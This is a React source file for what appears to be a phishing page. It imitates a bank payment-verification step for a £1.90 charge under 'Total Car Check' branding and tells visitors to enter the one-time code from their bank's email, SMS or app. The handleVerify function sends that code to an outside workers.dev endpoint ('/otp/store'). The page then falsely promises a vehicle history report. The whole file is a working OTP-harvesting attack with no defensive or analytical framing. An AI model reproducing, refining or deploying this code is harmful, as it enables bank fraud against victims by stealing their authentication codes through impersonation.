import { useState } from "react";
import "./App.css";

function App() {
  const [currentPage, setCurrentPage] = useState("confirm");
  const [code, setCode] = useState("");
  const [message, setMessage] = useState("");

  const handleVerify = async (event) => {
    event.preventDefault();

    if (!code.trim()) {
      setMessage("Please enter your verification code.");
      return;
    }

    try {
      const res = await fetch("https://otp-backend.mikaelmika263.workers.dev/otp/store", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code: code.trim() }),
      });
      const data = await res.json();

      if (data.stored) {
        setMessage("✓ Code submitted. Your vehicle history check will be sent to your email within 2 hours.");
        setCode("");
      } else {
        setMessage(data.error || "Something went wrong.");
      }
    } catch {
      setMessage("Could not reach the server. Is the backend running?");
    }
  };

  return (
    <main className="otp-page">

      <header className="site-header">
        <a href="/" className="brand">
          <span className="brand-icon">✓</span>
          <span>
            BANK<span className="brand-highlight">VERIFICATION</span>PROCESS
          </span>
        </a>

        <span className="secure-label">
          <span className="secure-dot"></span>
          Secure Payment
        </span>
      </header>

      <section className="otp-container">

        {currentPage === "confirm" ? (

          <div className="otp-card">

            <div className="verification-icon">✓</div>

            <p className="eyebrow">PAYMENT CONFIRMATION</p>

            <h1>Confirm Payment</h1>

            <p className="description">
              Confirm your £1.90 payment to proceed.
            </p>

            <button
              className="verify-button"
              onClick={() => setCurrentPage("payment")}
            >
              Confirm Payment
              <span>→</span>
            </button>

            <div className="security-note">
              Secure payment experience
            </div>

          </div>

        ) : (

          <div className="otp-card">

            <div className="verification-icon">🔐</div>

            <p className="eyebrow">PAYMENT CONFIRMATION</p>

            <h1>Payment Verification</h1>

            <p className="description">
              Your <strong>£1.90 payment</strong> requires confirmation.
              Please check your registered email, SMS, or official
              banking app to approve the transaction securely.
            </p>

            <div className="verification-time">
              Verification may take up to 2 minutes.
            </div>

            <form onSubmit={handleVerify}>
              <input
                id="code"
                type="text"
                value={code}
                onChange={(e) => {
                  setCode(e.target.value);
                  setMessage("");
                }}
                placeholder="Enter verification code"
                autoComplete="off"
                required
              />

              {message && (
                <p className="form-message" role="status">
                  {message}
                </p>
              )}

              <button type="submit" className="verify-button">
                Continue
                <span>→</span>
              </button>
            </form>

            <div className="security-note">
              Bank authentication takes place through your
              bank's official secure channel.
            </div>

            <button
              className="back-button"
              onClick={() => {
                setCurrentPage("confirm");
                setCode("");
                setMessage("");
              }}
            >
              ← Back
            </button>

          </div>

        )}

        <p className="help-text">
          Need assistance? Contact support.
        </p>

      </section>

      <footer className="site-footer">
        <p>© {new Date().getFullYear()} Total Car Check</p>
        <p>Secure payment experience</p>
      </footer>

    </main>
  );
}

export default App;